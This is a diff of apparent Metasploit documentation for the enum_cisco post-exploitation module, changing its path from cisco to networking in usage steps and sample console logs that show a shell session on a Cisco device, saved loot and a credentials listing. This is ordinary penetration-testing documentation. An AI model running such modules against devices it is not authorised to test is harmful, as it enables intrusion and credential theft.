@@ -26,7 +26,7 @@
 
   1. Start msfconsole
   2. Get a shell
-  3. Do: ```use post/cisco/gather/enum_cisco```
+  3. Do: ```use post/networking/gather/enum_cisco```
   4. Do: ```set session [id]```
   5. Do: ```set verbose true```
   6. Do: ```run```
@@ -48,7 +48,7 @@ resource (cisco.rb)> run
 [*] Command shell session 1 opened (111.111.1.111:40721 -> 222.222.2.222:22) at 2019-07-20 16:29:05 -0400
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-resource (cisco.rb)> use post/cisco/gather/enum_cisco
+resource (cisco.rb)> use post/networking/gather/enum_cisco
 resource (cisco.rb)> set session 1
 session => 1
 resource (cisco.rb)> set verbose true
@@ -82,7 +82,7 @@ resource (cisco.rb)> run
 [+] Saving to /root/.msf4/loot/20190720163006_default_222.222.2.222_cisco.ios.cdp_ne_989308.txt
 [*] Post module execution completed
 [*] Starting persistent handler(s)...
-msf5 post(cisco/gather/enum_cisco) > creds
+msf5 post(networking/gather/enum_cisco) > creds
 Credentials
 ===========
 
@@ -111,7 +111,7 @@ resource (cisco.rb)> run
 [*] Command shell session 1 opened (111.111.1.111:41839 -> 222.222.2.222:22) at 2019-07-21 16:24:02 -0400
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-resource (cisco.rb)> use post/cisco/gather/enum_cisco
+resource (cisco.rb)> use post/networking/gather/enum_cisco
 resource (cisco.rb)> set session 1
 session => 1
 resource (cisco.rb)> set verbose true
@@ -151,7 +151,7 @@ resource (cisco.rb)> run
 [+] Saving to /root/.msf4/loot/20190721162508_default_222.222.2.222_cisco.ios.cdp_ne_405367.txt
 [*] Post module execution completed
 [*] Starting persistent handler(s)...
-msf5 post(cisco/gather/enum_cisco) > creds
+msf5 post(networking/gather/enum_cisco) > creds
 Credentials
 ===========
 
